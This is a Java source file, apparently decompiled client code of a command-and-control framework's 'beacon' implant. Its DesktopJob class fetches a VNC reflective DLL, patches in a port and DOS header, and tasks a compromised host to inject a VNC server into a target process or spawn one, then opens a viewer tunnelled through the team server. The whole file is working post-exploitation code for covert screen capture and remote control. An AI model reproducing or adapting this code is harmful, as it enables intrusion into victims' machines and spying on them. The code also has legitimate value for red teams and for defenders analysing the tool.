package beacon.jobs;

import aggressor.DataUtils;
import aggressor.Prefs;
import beacon.CommandBuilder;
import beacon.TaskBeacon;
import com.glavsoft.viewer.Viewer;
import common.BeaconEntry;
import common.Callback;
import common.CommonUtils;
import common.ReflectiveDLL;
import console.AssociatedPanel;

import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class DesktopJob implements Callback {

    protected TaskBeacon tasker;

    protected CommandBuilder builder = new CommandBuilder();

    protected String bid;

    protected int vport;

    protected int pid;

    protected boolean quality;

    protected boolean is64 = false;

    protected boolean isInject = false;

    public DesktopJob(TaskBeacon taskBeacon) {
        this.tasker = taskBeacon;
    }

    public String getTactic() {
        return "T1113";
    }

    protected void StartViewer(final String string, final int n, boolean bl) {
        String str1 = DataUtils.getTeamServerIP(this.tasker.getClient().getData());
        BeaconEntry beaconEntry = DataUtils.getBeacon(this.tasker.getClient().getData(), string);
        String str2 = beaconEntry.title("Desktop");
        new Viewer(str1, n, bl, new Viewer.ViewerCallback() {

            @Override
            public void connected(final Viewer viewer) {
                // AssociatedPanel associatedPanel = new AssociatedPanel(bid);
                AssociatedPanel associatedPanel = new AssociatedPanel(string); //cfr
                associatedPanel.setLayout(new BorderLayout());
                associatedPanel.add(viewer, "Center");
                // DesktopJob.this.tasker.getClient().getTabManager().addTab(title, associatedPanel, new ActionListener() {
                tasker.getClient().getTabManager().addTab(str2, associatedPanel, new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent actionEvent) {
                        tasker.getClient().getConnection().call("beacons.pivot_stop_port", CommonUtils.args(n));
                        // tasker.getClient().getConnection().call("beacons.pivot_stop_port", CommonUtils.args(n));
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                viewer.closeApp();
                            }
                        }, "VNC Viewer Cleanup").start();
                    }
                }, "VNC client");
            }
        });
    }

    public void inject(String string1, int n, String string2, boolean bl) {
        this.bid = string1;
        this.quality = bl;
        this.isInject = true;
        this.pid = n;
        this.is64 = "x64".equals(string2);
        this.vport = Prefs.getPreferences().getRandomPort("client.vncports.string", "5000-9999");
        BeaconEntry beaconEntry = DataUtils.getBeacon(this.tasker.getClient().getData(), string1);
        if (beaconEntry == null) {
            this.tasker.error("Could not find Beacon entry (wait for it to checkin)");
            return;
        }
        if (this.is64) {
            this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x64.dll"), this);
        } else {
            this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x86.dll"), this);
        }
    }

    public void spawn(String string1, String string2, boolean bl) {
        this.bid = string1;
        this.quality = bl;
        this.is64 = "x64".equals(string2);
        BeaconEntry beaconEntry = DataUtils.getBeacon(this.tasker.getClient().getData(), string1);
        if (beaconEntry == null) {
            this.tasker.error("Could not find Beacon entry (wait for it to checkin)");
            return;
        }
        this.vport = Prefs.getPreferences().getRandomPort("client.vncports.string", "5000-9999");
        if (this.is64) {
            this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x64.dll"), this);
        } else {
            this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x86.dll"), this);
        }
    }

    public byte[] fix(byte[] arrby) {
        String str = CommonUtils.pad(this.vport + "", Character.MIN_VALUE, 32);
        arrby = CommonUtils.patch(arrby, "VNC AAAABBBBCCCC", str);
        return arrby;
    }

    @Override
    public void result(String string, Object object) {
        byte[] arrby1 = fix((byte[]) object);
        if (this.isInject) {
            byte[] arrby;
            if (this.is64) {
                arrby = ReflectiveDLL.patchDOSHeaderX64(arrby1, 170532320);
                this.builder.setCommand(46);
            } else {
                arrby = ReflectiveDLL.patchDOSHeader(arrby1, 170532320);
                this.builder.setCommand(45);
            }
            this.builder.addShort(this.vport);
            this.builder.addInteger(this.pid);
            this.builder.addInteger(0);
            this.builder.addString(arrby);
        } else {
            byte[] arrby;
            if (this.is64) {
                arrby = ReflectiveDLL.patchDOSHeaderX64(arrby1);
                this.builder.setCommand(91);
            } else {
                arrby = ReflectiveDLL.patchDOSHeader(arrby1);
                this.builder.setCommand(18);
            }
            this.builder.addShort(this.vport);
            this.builder.addString(arrby);
        }
        byte[] arrby2 = this.builder.build();
        this.tasker.whitelistPort(this.bid, this.vport);
        if (this.isInject) {
            String str = this.is64 ? "x64" : "x86";
            this.tasker.task(this.bid, arrby2, "Tasked beacon to inject VNC server into " + this.pid + "/" + str);
        } else {
            this.tasker.task(this.bid, arrby2, "Tasked beacon to spawn VNC server");
        }
        StartViewer(this.bid, this.vport, this.quality);
    }
}
